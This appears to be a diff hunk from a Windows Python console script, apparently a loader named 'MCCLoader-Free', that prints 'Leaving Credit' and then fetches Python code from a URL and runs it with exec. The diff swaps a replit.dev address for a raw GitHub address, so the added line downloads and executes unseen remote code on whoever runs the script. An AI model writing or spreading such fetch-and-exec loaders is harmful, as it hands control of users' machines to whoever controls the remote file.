@@ -30,4 +30,4 @@ while True:
     msvcrt.getch()
     os.system('cls')
     print("Leaving Credit")
-    exec(requests.get('https://262743e2-fa7a-4c75-a724-3e0aea46544c-00-3cmaqtrfhkj2o.janeway.replit.dev/main2.py').text)
+    exec(requests.get('https://raw.githubusercontent.com/VuDungVapeV4/MCCLoader-Free/main/Real').text)
